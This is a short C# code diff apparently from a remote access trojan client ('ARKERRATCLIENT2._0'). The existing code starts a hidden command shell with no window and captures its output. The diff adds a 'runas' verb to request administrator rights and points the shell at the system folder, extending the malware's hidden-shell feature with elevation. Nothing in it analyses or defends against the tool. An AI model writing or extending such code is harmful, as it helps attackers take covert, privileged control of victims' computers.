@@ -27,7 +27,10 @@ namespace ARKERRATCLIENT2._0
                     processStartInfo.RedirectStandardError = true;
                     processStartInfo.CreateNoWindow = true;
 
-                    cmd = new Process();
+                processStartInfo.Verb = "runas"; // Run as administrator
+                processStartInfo.WorkingDirectory = Environment.GetFolderPath(Environment.SpecialFolder.System);
+
+                cmd = new Process();
                     cmd.StartInfo = processStartInfo;
                     cmd.OutputDataReceived += Cmd_OutputDataReceived;
                     cmd.ErrorDataReceived += Cmd_ErrorDataReceived;
